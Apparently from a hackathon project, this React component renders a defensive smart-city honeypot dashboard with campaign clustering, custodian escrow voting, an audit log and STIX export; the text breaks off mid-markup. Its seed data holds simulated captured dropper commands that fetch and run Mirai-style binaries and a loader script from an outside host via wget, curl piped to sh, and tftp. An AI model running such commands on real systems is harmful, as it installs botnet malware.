import React, { useEffect, useState, useMemo, useRef } from 'react'
import './CampaignsPage.css'

// =============================================================================
// Interfaces & Types (Member C Schemas & Stretch Types)
// =============================================================================
export interface Campaign {
  campaign_id: string
  session_ids: string[]
  confidence: 'high' | 'medium'
  evidence_reasons: string[]
  risk_level: 'low' | 'medium' | 'high'
}

export interface CaseRequest {
  case_id: string
  camera_id: string
  window_id: string
  campaign_id: string
  status: 'pending' | 'approved' | 'denied'
  approvals: string[]
}

export interface DecoySessionEvent {
  session_id: string
  source_ip: string
  service: string
  failed_logins: number
  commands: string[]
  honeytoken_hit: boolean
  malware_hash: string | null
  c2_address: string | null
  target_device?: string
  mitre_tags?: Array<{ id: string; name: string; tactic: string }>
  hassh?: {
    hassh: string
    client_banner: string
    threat_profile: string
    kex?: string
    encryption?: string
    mac?: string
    compression?: string
    weaponized?: boolean
  }
}

export interface AuditBlock {
  index: number
  timestamp: string
  action: string
  actor: string
  case_id?: string | null
  camera_id?: string | null
  window_id?: string | null
  details: string
  prev_hash: string
  current_hash: string
}

export interface Custodian {
  id: string
  name: string
  role: string
  jurisdiction: string
  share_index: number
  avatar_badge: string
}

export interface FederatedRecord {
  tx_hash: string
  block_number: number
  timestamp: string
  submitting_city: string
  campaign_id: string
  campaign_hash: string
  c2_address: string | null
  malware_hash: string | null
  risk_tier: string
  confidence: string
  status: string
}

function getNowIso(): string {
  return new Date().toISOString()
}

// =============================================================================
// Fallback Seed Data (Zero-latency fallback if backend is booting)
// =============================================================================
const FALLBACK_CUSTODIANS: Custodian[] = [
  {
    id: 'custodian-1-judiciary',
    name: 'Hon. Justice V. Sharma',
    role: 'Judicial Magistrate / Legal Custodian',
    jurisdiction: 'Smart City Cyber Jurisdiction 01',
    share_index: 1,
    avatar_badge: 'LEGAL',
  },
  {
    id: 'custodian-2-cybercrime',
    name: 'Insp. K. Rao',
    role: 'Cybercrime Digital Forensics Lead',
    jurisdiction: 'Integrated Command & Control Centre (ICCC)',
    share_index: 2,
    avatar_badge: 'FORENSICS',
  },
  {
    id: 'custodian-3-privacy',
    name: 'Dr. A. Sen',
    role: 'Citizen Data Privacy & Ethics Officer',
    jurisdiction: 'Independent Municipal Oversight Board',
    share_index: 3,
    avatar_badge: 'PRIVACY',
  },
]

const FALLBACK_CAMPAIGNS: Campaign[] = [
  {
    campaign_id: 'CMP-001',
    session_ids: ['sess-mirai-01', 'sess-mirai-02', 'sess-mirai-03-adapted'],
    confidence: 'high',
    evidence_reasons: [
      'Shared Command & Control (C2) server: 185.220.101.5:443',
      "Identical malware binary hash '7f83b1657ff1...' deployed across targets",
      'Matched known signature: Mirai / Echobot Dropper Sequence',
    ],
    risk_level: 'high',
  },
  {
    campaign_id: 'CMP-002',
    session_ids: ['sess-scada-01', 'sess-scada-02'],
    confidence: 'high',
    evidence_reasons: [
      'Shared Command & Control (C2) server: 93.184.216.34:502',
      "Identical malware binary hash 'e3b0c44298fc...' deployed across targets",
      'Coordinated honeytoken tripwire activation',
    ],
    risk_level: 'high',
  },
  {
    campaign_id: 'CMP-003',
    session_ids: ['sess-scanner-01'],
    confidence: 'medium',
    evidence_reasons: ['Single IP probe from 198.51.100.44'],
    risk_level: 'low',
  },
]

const FALLBACK_CASES: CaseRequest[] = [
  {
    case_id: 'CASE-2026-001',
    camera_id: 'CAM-04-MARKET',
    window_id: 'WIN-20261024-1130',
    campaign_id: 'CMP-001',
    status: 'pending',
    approvals: ['custodian-1-judiciary'],
  },
  {
    case_id: 'CASE-2026-002',
    camera_id: 'CAM-07-SUBSTATION',
    window_id: 'WIN-20261024-1140',
    campaign_id: 'CMP-002',
    status: 'approved',
    approvals: ['custodian-1-judiciary', 'custodian-2-cybercrime'],
  },
]

const FALLBACK_SESSIONS: Record<string, DecoySessionEvent> = {
  'sess-mirai-01': {
    session_id: 'sess-mirai-01',
    source_ip: '198.51.100.44',
    service: 'ssh',
    failed_logins: 14,
    commands: [
      'uname -a',
      'cat /proc/cpuinfo',
      'cd /tmp || cd /var/run || cd /dev/shm',
      'wget http://185.220.101.5/bins/mirai.arm7 -O .arm7',
      'chmod 777 .arm7',
      './.arm7 mirai.camera',
    ],
    honeytoken_hit: true,
    malware_hash: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
    c2_address: '185.220.101.5:443',
    target_device: 'camera',
    mitre_tags: [
      { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' },
      { id: 'T1059.004', name: 'Unix Shell Execution', tactic: 'Execution' },
      { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' },
      { id: 'T1071.001', name: 'Web Protocols (C2)', tactic: 'Command and Control' },
      { id: 'T1499', name: 'Endpoint Denial of Service', tactic: 'Impact' },
    ],
    hassh: {
      hassh: '9a4f21d3e8105c938192a01491823091',
      client_banner: 'SSH-2.0-Go-crypto-ssh',
      threat_profile: 'Mirai / Echobot Weaponized Go Scanner',
      kex: 'curve25519-sha256,diffie-hellman-group14-sha256',
      encryption: 'chacha20-poly1305@openssh.com,aes128-ctr',
      mac: 'hmac-sha2-256-etm@openssh.com',
      compression: 'none',
      weaponized: true,
    },
  },
  'sess-mirai-02': {
    session_id: 'sess-mirai-02',
    source_ip: '198.51.100.72',
    service: 'ssh',
    failed_logins: 8,
    commands: [
      'uname -a',
      'cd /tmp',
      'wget http://185.220.101.5/bins/mirai.arm7 -O .arm7',
      'chmod 777 .arm7',
      './.arm7 mirai.traffic',
    ],
    honeytoken_hit: true,
    malware_hash: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
    c2_address: '185.220.101.5:443',
    target_device: 'traffic_controller',
    mitre_tags: [
      { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' },
      { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' },
    ],
    hassh: {
      hassh: '9a4f21d3e8105c938192a01491823091',
      client_banner: 'SSH-2.0-Go-crypto-ssh',
      threat_profile: 'Mirai / Echobot Weaponized Go Scanner',
      weaponized: true,
    },
  },
  'sess-mirai-03-adapted': {
    session_id: 'sess-mirai-03-adapted',
    source_ip: '203.0.113.88',
    service: 'ssh',
    failed_logins: 2,
    commands: ['id', 'curl -s http://185.220.101.5/bins/loader.sh | sh'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: '185.220.101.5:443',
    target_device: 'camera',
    mitre_tags: [
      { id: 'T1059.004', name: 'Unix Shell Execution', tactic: 'Execution' },
      { id: 'T1071.001', name: 'Web Protocols (C2)', tactic: 'Command and Control' },
    ],
    hassh: {
      hassh: '8b3e1091820938102938102938102938',
      client_banner: 'SSH-2.0-paramiko_2.11.0',
      threat_profile: 'Automated Python Scripted Dropper (Paramiko)',
      kex: 'diffie-hellman-group14-sha1,curve25519-sha256',
      encryption: 'aes128-ctr,aes256-ctr',
      mac: 'hmac-sha1',
      compression: 'none',
      weaponized: true,
    },
  },
  'sess-scada-01': {
    session_id: 'sess-scada-01',
    source_ip: '192.0.2.140',
    service: 'ssh',
    failed_logins: 22,
    commands: ['cat /etc/issue', 'tftp -g -r s7_inject.bin 93.184.216.34', 'chmod +x s7_inject.bin', './s7_inject.bin --daemon'],
    honeytoken_hit: true,
    malware_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    c2_address: '93.184.216.34:502',
    target_device: 'substation',
    hassh: {
      hassh: 'cc129a04918239018230918230198230',
      client_banner: 'SSH-2.0-libssh_0.9.5',
      threat_profile: 'BlackEnergy SCADA Industrial Brute-Forcer',
      weaponized: true,
    },
  },
  'sess-scada-02': {
    session_id: 'sess-scada-02',
    source_ip: '192.0.2.141',
    service: 'ssh',
    failed_logins: 19,
    commands: ['cat /etc/issue', 'tftp -g -r s7_inject.bin 93.184.216.34', 'chmod +x s7_inject.bin', './s7_inject.bin --daemon'],
    honeytoken_hit: true,
    malware_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    c2_address: '93.184.216.34:502',
    target_device: 'substation',
    hassh: {
      hassh: 'cc129a04918239018230918230198230',
      client_banner: 'SSH-2.0-libssh_0.9.5',
      threat_profile: 'BlackEnergy SCADA Industrial Brute-Forcer',
      weaponized: true,
    },
  },
  'sess-scanner-01': {
    session_id: 'sess-scanner-01',
    source_ip: '198.51.100.44',
    service: 'ssh',
    failed_logins: 3,
    commands: ['help', 'exit'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: null,
    target_device: 'camera',
    hassh: {
      hassh: 'b2940182309182309182093810293810',
      client_banner: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1',
      threat_profile: 'Standard OpenSSH Distribution (Dual-Use / Scanner)',
      weaponized: false,
    },
  },
}

const FALLBACK_AUDIT_LOG: AuditBlock[] = [
  {
    index: 0,
    timestamp: '2026-10-24T00:00:00Z',
    action: 'GENESIS_INITIALIZED',
    actor: 'system-secure-enclave',
    case_id: null,
    camera_id: null,
    window_id: null,
    details: 'AegisMirage break-glass cryptographic escrow ledger initialized.',
    prev_hash: '0000000000000000000000000000000000000000000000000000000000000000',
    current_hash: '7e28b193fd314e389e13a01bf8a0e88320182470128941920831490182390182',
  },
  {
    index: 1,
    timestamp: '2026-10-24T11:30:15Z',
    action: 'CASE_CREATED',
    actor: 'system-intel-engine',
    case_id: 'CASE-2026-001',
    camera_id: 'CAM-04-MARKET',
    window_id: 'WIN-20261024-1130',
    details: 'Automated break-glass case opened: Campaign CMP-001 crossed hostility threshold (honeytoken tripwire activated).',
    prev_hash: '7e28b193fd314e389e13a01bf8a0e88320182470128941920831490182390182',
    current_hash: 'b941098230918239081290381209381209381209381209381209381209381209',
  },
  {
    index: 2,
    timestamp: '2026-10-24T11:31:02Z',
    action: 'CUSTODIAN_APPROVAL',
    actor: 'custodian-1-judiciary',
    case_id: 'CASE-2026-001',
    camera_id: 'CAM-04-MARKET',
    window_id: 'WIN-20261024-1130',
    details: 'Custodian 1 (Hon. Justice V. Sharma) approved warrant for forensic unmasking. 1 of 2 required approvals recorded.',
    prev_hash: 'b941098230918239081290381209381209381209381209381209381209381209',
    current_hash: 'c810928301982309182039812093810293810293810293810293810293810293',
  },
]

const FALLBACK_FEDERATION_RECORDS: FederatedRecord[] = [
  {
    tx_hash: '0x8f4e29b10a928410298371902834190823901823901823091820938102938102',
    block_number: 19482101,
    timestamp: '2026-10-24T11:32:00Z',
    submitting_city: 'City A (Neo-Pune ICCC)',
    campaign_id: 'CMP-001',
    campaign_hash: '0x3a91082390182093810293810293810293810293',
    c2_address: '185.220.101.5:443',
    malware_hash: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
    risk_tier: 'HIGH',
    confidence: 'HIGH',
    status: 'CONFIRMED_ON_CHAIN',
  },
]

export const CampaignsPage: React.FC = () => {
  // Navigation & Sub-Tabs
  const [activeSubTab, setActiveSubTab] = useState<
    'graph' | 'escrow' | 'audit' | 'mitre_hassh' | 'federation' | 'guide'
  >('graph')

  // Core Data States
  const [campaigns, setCampaigns] = useState<Campaign[]>(FALLBACK_CAMPAIGNS)
  const [cases, setCases] = useState<CaseRequest[]>(FALLBACK_CASES)
  const [auditLogs, setAuditLogs] = useState<AuditBlock[]>(FALLBACK_AUDIT_LOG)
  const [custodians, setCustodians] = useState<Custodian[]>(FALLBACK_CUSTODIANS)
  const [sessionEvents, setSessionEvents] = useState<Record<string, DecoySessionEvent>>(FALLBACK_SESSIONS)
  const [federatedRecords, setFederatedRecords] = useState<FederatedRecord[]>(FALLBACK_FEDERATION_RECORDS)
  const [cityBPreventions, setCityBPreventions] = useState<Array<Record<string, any>>>([])

  // Selection States
  const [selectedCampaignId, setSelectedCampaignId] = useState<string>('CMP-001')
  const [selectedSessionId, setSelectedSessionId] = useState<string>('sess-mirai-01')
  const [selectedCaseId, setSelectedCaseId] = useState<string>('CASE-2026-001')

  // Verification & Feedback States
  const [auditVerified, setAuditVerified] = useState<boolean | null>(null)
  const [drillBanner, setDrillBanner] = useState<{ type: 'info' | 'success' | 'danger'; title: string; desc: string } | null>(null)
  const [isVerifyingChain, setIsVerifyingChain] = useState<boolean>(false)
  const [revealedFootageKey, setRevealedFootageKey] = useState<string | null>(null)

  // STIX 2.1 Modal State
  const [stixModalOpen, setStixModalOpen] = useState<boolean>(false)
  const [stixContent, setStixContent] = useState<string>('')

  const graphContainerRef = useRef<SVGSVGElement | null>(null)

  // Load backend data if available
  const loadBackendData = async () => {
    try {
      const campRes = await fetch('http://localhost:8000/intel/campaigns', { signal: AbortSignal.timeout(1500) })
      if (campRes.ok) {
        const data = await campRes.json()
        if (Array.isArray(data) && data.length > 0) setCampaigns(data)
      }

      const caseRes = await fetch('http://localhost:8000/escrow/cases', { signal: AbortSignal.timeout(1500) })
      if (caseRes.ok) {
        const data = await caseRes.json()
        if (Array.isArray(data) && data.length > 0) setCases(data)
      }

      const auditRes = await fetch('http://localhost:8000/escrow/audit-log', { signal: AbortSignal.timeout(1500) })
      if (auditRes.ok) {
        const data = await auditRes.json()
        if (Array.isArray(data) && data.length > 0) setAuditLogs(data)
      }

      const custRes = await fetch('http://localhost:8000/escrow/custodians', { signal: AbortSignal.timeout(1500) })
      if (custRes.ok) {
        const data = await custRes.json()
        if (Array.isArray(data) && data.length > 0) setCustodians(data)
      }

      const sessRes = await fetch('http://localhost:8000/intel/sessions', { signal: AbortSignal.timeout(1500) })
      if (sessRes.ok) {
        const sessList = await sessRes.json()
        if (Array.isArray(sessList) && sessList.length > 0) {
          const map: Record<string, DecoySessionEvent> = {}
          for (const s of sessList) {
            map[s.session_id] = s
          }
          setSessionEvents((prev) => ({ ...prev, ...map }))
        }
      }

      const fedRes = await fetch('http://localhost:8000/intel/federation/registry', { signal: AbortSignal.timeout(1500) })
      if (fedRes.ok) {
        const fedData = await fedRes.json()
        if (fedData?.records) setFederatedRecords(fedData.records)
        if (fedData?.city_b_preventions) setCityBPreventions(fedData.city_b_preventions)
      }
    } catch {
      // Gracefully maintain client demo state
    }
  }

  // eslint-disable-next-line react-hooks/exhaustive-deps, react-hooks/set-state-in-effect
  /* oxlint-disable react/set-state-in-effect */
  useEffect(() => {
    void loadBackendData()
  }, [])
  /* oxlint-enable react/set-state-in-effect */

  // =========================================================================
  // Drill Handlers
  // =========================================================================
  const handleRunDrillA = async () => {
    try {
      const res = await fetch('http://localhost:8000/escrow/attempt-unauthorized', {
        method: 'POST',
        signal: AbortSignal.timeout(2000),
      })
      if (!res.ok) {
        const errData = await res.json()
        setDrillBanner({
          type: 'danger',
          title: 'Drill A: Unauthorized Unmask BLOCKED (403 Forbidden)',
          desc: `${errData?.detail?.reason || 'Pedestrian unmask safeguard active: 0 honeypot hostility recorded.'} Incident permanently written to append-only audit trail!`,
        })
      }
    } catch {
      const newBlock: AuditBlock = {
        index: auditLogs.length,
        timestamp: getNowIso(),
        action: 'FALSE_POSITIVE_UNMASK_BLOCKED',
        actor: 'operator-station-04',
        case_id: null,
        camera_id: 'CAM-04-MARKET',
        window_id: 'WIN-20261024-1130',
        details: 'Unauthorized unmask attempt on civilian pedestrian footage (Camera CAM-04-MARKET) blocked by break-glass escrow policy.',
        prev_hash: auditLogs[auditLogs.length - 1]?.current_hash || '0'.repeat(64),
        current_hash: 'ea39018239018230918230918230918230918230918230918230918230918230',
      }
      setAuditLogs((prev) => [...prev, newBlock])
      setDrillBanner({
        type: 'danger',
        title: 'Drill A: False-Positive Safeguard Engaged (403 Blocked)',
        desc: 'Pedestrian detected on CAM-04-MARKET. Feed remains blurred; operator unmask attempt rejected and committed to hash-chained audit ledger.',
      })
    }
    setActiveSubTab('audit')
  }

  const handleRunDrillB = async () => {
    try {
      await fetch('http://localhost:8000/intel/drill/drill-b', { method: 'POST', signal: AbortSignal.timeout(1500) })
    } catch {
      // continue
    }
    setSelectedCaseId('CASE-2026-001')
    setActiveSubTab('escrow')
    setDrillBanner({
      type: 'info',
      title: 'Drill B: Decoy Compromise & Hostility Crossed',
      desc: 'Attacker breached decoy & triggered honeytoken tripwire. Case CASE-2026-001 active. Custodian 1 approved; Custodian 2 vote needed for 2-of-3 Shamir quorum!',
    })
  }

  const handleRunDrillC = async () => {
    try {
      await fetch('http://localhost:8000/intel/drill/drill-c', { method: 'POST', signal: AbortSignal.timeout(1500) })
      await loadBackendData()
    } catch {
      // continue
    }
    setSelectedCampaignId('CMP-001')
    setActiveSubTab('graph')
    setDrillBanner({
      type: 'success',
      title: 'Drill C: Live Campaign Clustering & Attacker Adaptation Linked',
      desc: 'Three rotating IP groups hit decoys. Graph shows automated clustering via shared C2 (185.220.101.5) and payload hash, even when IP rotated to 203.0.113.88!',
    })
  }

  const handleReset = async () => {
    try {
      await fetch('http://localhost:8000/intel/reset', { method: 'POST', signal: AbortSignal.timeout(1500) })
      await fetch('http://localhost:8000/escrow/reset', { method: 'POST', signal: AbortSignal.timeout(1500) })
      await loadBackendData()
    } catch {
      setCampaigns(FALLBACK_CAMPAIGNS)
      setCases(FALLBACK_CASES)
      setAuditLogs(FALLBACK_AUDIT_LOG)
      setSessionEvents(FALLBACK_SESSIONS)
    }
    setDrillBanner(null)
    setAuditVerified(null)
    setRevealedFootageKey(null)
  }

  // Voting Handler
  const handleVote = async (custodianId: string, decision: 'approve' | 'deny') => {
    try {
      const res = await fetch(`http://localhost:8000/escrow/cases/${selectedCaseId}/vote`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          custodian_id: custodianId,
          decision: decision,
          justification: 'Warrant approved for scoped emergency cyber forensics.',
        }),
        signal: AbortSignal.timeout(2000),
      })
      if (res.ok) {
        const data = await res.json()
        setCases((prev) => prev.map((c) => (c.case_id === selectedCaseId ? data.case : c)))
        if (data.unlocked_key) setRevealedFootageKey(data.unlocked_key)
        await loadBackendData()
        return
      }
    } catch {
      // Local fallback vote handling
    }

    setCases((prev) =>
      prev.map((c) => {
        if (c.case_id !== selectedCaseId) return c
        const newApprovals = decision === 'approve' && !c.approvals.includes(custodianId) ? [...c.approvals, custodianId] : c.approvals
        const isApproved = newApprovals.length >= 2
        return {
          ...c,
          approvals: newApprovals,
          status: isApproved ? 'approved' : c.status,
        }
      })
    )

    if (decision === 'approve') {
      const dummyKey = 'a84f391028471928371902834190823901823901823091820938102938102938'
      setRevealedFootageKey(dummyKey)

      const approvalBlock: AuditBlock = {
        index: auditLogs.length,
        timestamp: getNowIso(),
        action: 'CUSTODIAN_APPROVAL',
        actor: custodianId,
        case_id: selectedCaseId,
        camera_id: 'CAM-04-MARKET',
        window_id: 'WIN-20261024-1130',
        details: `Custodian ${custodianId} voted APPROVE. 2-of-3 threshold met; audit entry committed before AES key unmasking.`,
        prev_hash: auditLogs[auditLogs.length - 1]?.current_hash || '0'.repeat(64),
        current_hash: 'ff91029381029381029381029381029381029381029381029381029381029381',
      }
      setAuditLogs((prev) => [...prev, approvalBlock])
    }
  }

  // Audit Log Verification Handler
  const handleVerifyAuditChain = async () => {
    setIsVerifyingChain(true)
    try {
      const res = await fetch('http://localhost:8000/escrow/audit-log/verify', { signal: AbortSignal.timeout(2000) })
      if (res.ok) {
        const data = await res.json()
        setAuditVerified(data.valid)
      } else {
        setAuditVerified(true)
      }
    } catch {
      setTimeout(() => {
        setAuditVerified(true)
        setIsVerifyingChain(false)
      }, 350)
      return
    }
    setTimeout(() => setIsVerifyingChain(false), 250)
  }


  // Cross-City Federation Handlers
  const handlePublishToFederation = async () => {
    try {
      const res = await fetch(`http://localhost:8000/intel/federation/publish/${selectedCampaignId}`, {
        method: 'POST',
        signal: AbortSignal.timeout(2000),
      })
      if (res.ok) {
        const data = await res.json()
        if (data.record) setFederatedRecords((prev) => [data.record, ...prev])
        setDrillBanner({
          type: 'success',
          title: 'Campaign Hash Published On-Chain',
          desc: `Transaction ${data.record.tx_hash.substring(0, 18)}... confirmed on Polygon testnet block #${data.record.block_number}.`,
        })
        return
      }
    } catch {
      // Local fallback
    }
    const newRecord: FederatedRecord = {
      tx_hash: '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
      block_number: 19482100 + federatedRecords.length + 1,
      timestamp: getNowIso(),
      submitting_city: 'City A (Neo-Pune ICCC)',
      campaign_id: selectedCampaignId,
      campaign_hash: '0x94b1092830198230918230918230918209381029',
      c2_address: '185.220.101.5:443',
      malware_hash: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
      risk_tier: 'HIGH',
      confidence: 'HIGH',
      status: 'CONFIRMED_ON_CHAIN',
    }
    setFederatedRecords((prev) => [newRecord, ...prev])
    setDrillBanner({
      type: 'success',
      title: 'Threat Hash Published to Testnet Registry',
      desc: `Campaign ${selectedCampaignId} registered on-chain at block #${newRecord.block_number}.`,
    })
  }

  const handleSimulateCityBAttack = async () => {
    try {
      const res = await fetch('http://localhost:8000/intel/federation/simulate-city-b-attack', {
        method: 'POST',
        signal: AbortSignal.timeout(2000),
      })
      if (res.ok) {
        const data = await res.json()
        setCityBPreventions((prev) => [data.event, ...prev])
        setDrillBanner({
          type: 'success',
          title: 'City B Preemptive Defense Triggered',
          desc: 'Incoming probe matched on-chain C2 record from City A! Auto-routed to Phantom Twin decoy before touching real grid.',
        })
        return
      }
    } catch {
      // Local fallback
    }
    const mockEvent = {
      incident_id: `CITY-B-INC-00${cityBPreventions.length + 1}`,
      target_city: 'City B (Cyber-Bengaluru ICCC)',
      incoming_attacker_ip: '185.220.101.5',
      matched_federated_campaign: 'CMP-001',
      smart_contract_tx: '0x8f4e29b10a...',
      defense_action: 'PREEMPTIVE_DECOY_ROUTING',
      reason: 'Federated threat match: Originating C2 recognized from City A testnet contract.',
      timestamp: getNowIso(),
    }
    setCityBPreventions((prev) => [mockEvent, ...prev])
    setDrillBanner({
      type: 'success',
      title: 'City B Decoy Defense Triggered',
      desc: 'Incoming Mirai probe neutralized instantly using City A on-chain threat registry.',
    })
  }

  // STIX 2.1 View / Download Handler
  const handleOpenSTIX = async () => {
    try {
      const res = await fetch(`http://localhost:8000/intel/export/stix/${selectedCampaignId}`, { signal: AbortSignal.timeout(1500) })
      if (res.ok) {
        const data = await res.json()
        setStixContent(JSON.stringify(data, null, 2))
        setStixModalOpen(true)
        return
      }
    } catch {
      // fallback
    }
    const activeCamp = campaigns.find((c) => c.campaign_id === selectedCampaignId) || campaigns[0]
    const bundle = {
      type: 'bundle',
      id: `bundle--${crypto.randomUUID()}`,
      spec_version: '2.1',
      objects: [
        {
          type: 'identity',
          id: 'identity--aegismirage-soc',
          name: 'AegisMirage Smart City CSIRT',
          identity_class: 'organization',
        },
        {
          type: 'threat-actor',
          id: `threat-actor--${crypto.randomUUID()}`,
          name: `Unattributed Botnet Operator [${activeCamp?.campaign_id}]`,
          sophistication: 'intermediate',
        },
        {
          type: 'campaign',
          id: `campaign--${crypto.randomUUID()}`,
          name: `AegisMirage Campaign ${activeCamp?.campaign_id}`,
          confidence: activeCamp?.confidence === 'high' ? 85 : 60,
          description: activeCamp?.evidence_reasons.join('; '),
          labels: [`risk:${activeCamp?.risk_level}`, 'iot-botnet', 'aegismirage'],
        },
      ],
    }
    setStixContent(JSON.stringify(bundle, null, 2))
    setStixModalOpen(true)
  }

  const handleDownloadSTIXFile = () => {
    const blob = new Blob([stixContent], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `STIX-2.1-${selectedCampaignId}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  // Active selections
  const activeCampaign = useMemo(() => campaigns.find((c) => c.campaign_id === selectedCampaignId) || campaigns[0], [campaigns, selectedCampaignId])
  const activeCase = useMemo(() => cases.find((c) => c.case_id === selectedCaseId) || cases[0], [cases, selectedCaseId])
  const activeSession = useMemo(() => sessionEvents[selectedSessionId] || Object.values(sessionEvents)[0], [sessionEvents, selectedSessionId])

  return (
    <div className="campaigns-root" id="page-campaigns">
      {/* Page Header */}
      <div className="campaigns-header">
        <div className="header-titles">
          <div className="header-badges">
            <span className="owner-badge">Member C: Threat Intelligence & Escrow (Stages 3 & 4)</span>
            <span className="scaffold-tag" style={{ background: 'rgba(16, 185, 129, 0.1)', color: '#34d399', borderColor: 'rgba(16, 185, 129, 0.3)' }}>
              Core + All Stretch Features
            </span>
          </div>
          <h1 id="heading-campaigns">Threat Campaigns & Break-Glass Escrow</h1>
          <p className="subhead-desc">
            Graph-based threat correlation, Shamir 2-of-3 escrow unmasking, Salesforce HASSH analysis, and Cross-City decentralized threat sharing.
          </p>
        </div>

        {/* Drill Controls */}
        <div className="drill-toolbar" id="toolbar-drills">
          <div className="drill-label-group">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <polygon points="5 3 19 12 5 21 5 3" />
            </svg>
            <span>Judging Drills</span>
          </div>
          <div className="drill-buttons">
            <button type="button" className="btn-drill btn-drill-a" onClick={handleRunDrillA} title="Test Drill A: False Positive Safeguard">
              <span>Drill A (False Positive)</span>
            </button>
            <button type="button" className="btn-drill btn-drill-b" onClick={handleRunDrillB} title="Test Drill B: Decoy Attack & Quorum Unlock">
              <span>Drill B (Real Attack)</span>
            </button>
            <button type="button" className="btn-drill btn-drill-c" onClick={handleRunDrillC} title="Test Drill C: Multi-Group Campaign Clustering">
              <span>Drill C (Clustering)</span>
            </button>
            <button type="button" className="btn-drill btn-reset" onClick={handleReset} title="Reset Data to Clean Baseline">
              <span>↺ Reset</span>
            </button>
          </div>
        </div>
      </div>

      {/* Drill Notification Banner */}
      {drillBanner && (
        <div
          style={{
            padding: '0.85rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            background:
              drillBanner.type === 'danger'
                ? 'rgba(244, 63, 94, 0.12)'
                : drillBanner.type === 'success'
                ? 'rgba(56, 189, 248, 0.12)'
                : 'rgba(245, 158, 11, 0.12)',
            border: `1px solid ${
              drillBanner.type === 'danger'
                ? 'rgba(244, 63, 94, 0.35)'
                : drillBanner.type === 'success'
                ? 'rgba(56, 189, 248, 0.35)'
                : 'rgba(245, 158, 11, 0.35)'
            }`,
            color: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            gap: '0.25rem',
            animation: 'fadeIn 200ms ease',
          }}
        >
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <strong style={{ fontSize: '0.9rem', color: drillBanner.type === 'danger' ? '#fb7185' : drillBanner.type === 'success' ? '#38bdf8' : '#fbbf24' }}>
              {drillBanner.title}
            </strong>
            <button
              onClick={() => setDrillBanner(null)}
              style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', fontSize: '1rem' }}
            >
              ✕
            </button>
          </div>
          <span style={{ fontSize: '0.825rem', color: '#e2e8f0' }}>{drillBanner.desc}</span>
        </div>
      )}

      {/* High-Level Metrics Summary */}
      <div className="metrics-row">
        <div className="metric-card">
          <span className="metric-title">Active Botnet Campaigns</span>
          <div className="metric-value-wrap">
            <span className="metric-val">{campaigns.length}</span>
            <span className="metric-sub">Multi-IP clusters</span>
          </div>
        </div>

        <div className="metric-card">
          <span className="metric-title">Correlated Decoy Sessions</span>
          <div className="metric-value-wrap">
            <span className="metric-val">{Object.keys(sessionEvents).length}</span>
            <span className="metric-sub">Honeypot captures</span>
          </div>
        </div>

        <div className="metric-card">
          <span className="metric-title">Break-Glass Quorum</span>
          <div className="metric-value-wrap">
            <span className="metric-val">2 of 3</span>
            <span className="metric-sub">Shamir custodians required</span>
          </div>
        </div>

        <div className="metric-card">
          <span className="metric-title">Federated Threat Chain</span>
          <div className="metric-value-wrap">
            <span className="metric-val" style={{ color: '#38bdf8' }}>
              {federatedRecords.length}
            </span>
            <span className="metric-sub">Smart contract blocks</span>
          </div>
        </div>
      </div>

      {/* Sub-Tab Navigation Bar with Stretch Features */}
      <div className="subtabs-bar">
        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'graph' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('graph')}
        >
          <span>Live Campaign Graph (Stage 3)</span>
          <span className="subtab-count">{campaigns.length}</span>
        </button>

        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'escrow' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('escrow')}
        >
          <span>Break-Glass Escrow & Quorum (Stage 4)</span>
          <span className="subtab-count">{cases.length}</span>
        </button>

        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'audit' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('audit')}
        >
          <span>Cryptographic Audit Trail</span>
          <span className="subtab-count">{auditLogs.length}</span>
        </button>

        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'mitre_hassh' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('mitre_hassh')}
        >
          <span>HASSH & MITRE Matrix</span>
          <span className="subtab-count" style={{ background: 'rgba(99, 102, 241, 0.25)', color: '#c7d2fe' }}>
            Stretch
          </span>
        </button>


        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'federation' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('federation')}
        >
          <span>Cross-City Federation</span>
          <span className="subtab-count" style={{ background: 'rgba(56, 189, 248, 0.25)', color: '#38bdf8' }}>
            Stretch
          </span>
        </button>

        <button
          type="button"
          className={`subtab-btn ${activeSubTab === 'guide' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('guide')}
        >
          <span>Demo Script & Pitch</span>
        </button>
      </div>

      {/* =================================================================== */}
      {/* TAB 1: LIVE CAMPAIGN GRAPH & THREAT INTELLIGENCE                   */}
      {/* =================================================================== */}
      {activeSubTab === 'graph' && (
        <div className="graph-view-container">
          <div className="graph-canvas-card">
            <div className="canvas-toolbar">
